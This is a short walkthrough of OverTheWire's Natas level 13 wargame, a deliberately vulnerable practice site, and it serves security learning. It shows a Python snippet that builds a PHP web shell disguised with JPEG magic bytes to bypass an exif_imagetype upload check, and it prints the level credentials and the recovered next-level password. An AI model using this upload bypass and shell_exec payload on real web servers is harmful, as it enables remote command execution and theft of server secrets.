# Natas Level 13
The ***URL*** to which you need to connect is *http://natas13.natas.labs.overthewire.org*. The ***username*** is *natas13* and the ***password*** is *jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY*. 

Lets check the [viewsource](http://natas13.natas.labs.overthewire.org/index-source.html) link.
By analyzing the php script in the source code We see a exif_imagetype bypass. So Lets make a php file with a jpeg signature "\xFF\xD8\xFF\xE0"

```Python
fh = open('script.php', 'w')
fh.write('\xFF\xD8\xFF\xE0' + '<? echo shell_exec("cat /etc/natas_webpass/natas14"); ?>')
fh.close()
```
And we change the extension like we did in [Level12](https://github.com/Reda-BELHAJ/OverTheWire/blob/main/Natas/Natas10-20/Level12.md)
```
The password for natas14 is Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```
